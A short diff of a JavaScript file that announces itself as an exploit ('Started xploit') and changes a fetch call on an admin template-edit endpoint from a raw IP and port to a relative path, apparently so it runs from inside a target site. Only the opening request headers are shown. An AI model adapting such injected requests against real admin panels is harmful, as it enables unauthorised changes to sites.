@@ -1,5 +1,5 @@
 console.log("Started xploit")
-let x = fetch("http://91.205.40.51:29675/admin/templates/1/edit", {
+let x = fetch("/admin/templates/1/edit", {
   "headers": {
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
     "accept-language": "en-US,en;q=0.9",
